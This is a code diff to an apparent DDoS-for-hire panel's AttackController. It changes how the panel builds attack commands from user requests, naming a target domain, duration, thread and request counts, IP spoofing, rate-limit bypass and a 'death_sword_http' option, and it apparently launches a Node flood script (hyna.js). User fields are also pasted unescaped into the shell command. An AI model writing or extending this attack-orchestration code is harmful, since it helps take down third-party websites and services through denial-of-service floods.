@@ -148,9 +148,11 @@ class AttackController:
         modeValue = data.get('mode')
         concurrentValue = data.get('concurrents')
         requestCount = data.get('request')
-        spoofCount = data.get('spoof')
+        spoof = data.get('spoof', '')
+        death_sword_http = data.get('death_sword_http', '')
+        death_sword_http = str(death_sword_http) if death_sword_http is not None else ""
         typeAttack = data.get('typeAttack')
-        
+
         # Check blacklisted domains
         for blacklisted in BLACKLISTED_DOMAINS:
             if blacklisted in domainName.lower():
@@ -197,14 +199,14 @@ class AttackController:
                     "message": "No valid servers found in the request"
                 }), 400 
 
-        if spoofCount is not None:
-            attackCommand = f"{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --auth true --ratelimit {bypassRateLimitValue} --spoof {str(data.get('spoof')).lower()}"
+        if modeValue == 'xvfb-run node hyna.js':
+            attackCommand = f'{modeValue} {domainName} -s {attackTimeValue} -t {concurrentValue} -r {requestCount} -p {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http} {spoof} --ratelimit {bypassRateLimitValue}'
         else:
-            attackCommand = f"{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --auth true --ratelimit {bypassRateLimitValue}"
+            attackCommand = f'{modeValue} {domainName} -s {attackTimeValue} -t {concurrentValue} -r {requestCount} -p {coreStrengthValue} {death_sword_http} --ratelimit {bypassRateLimitValue}'
+        attackCommand = ' '.join(attackCommand.split())
 
         print(attackCommand)
-            
-        # Create attack log entryJ
+        # Create attack log entry
         attackLog = AttackLog(
             userId=currentUser['id'],
             domainName=domainName,
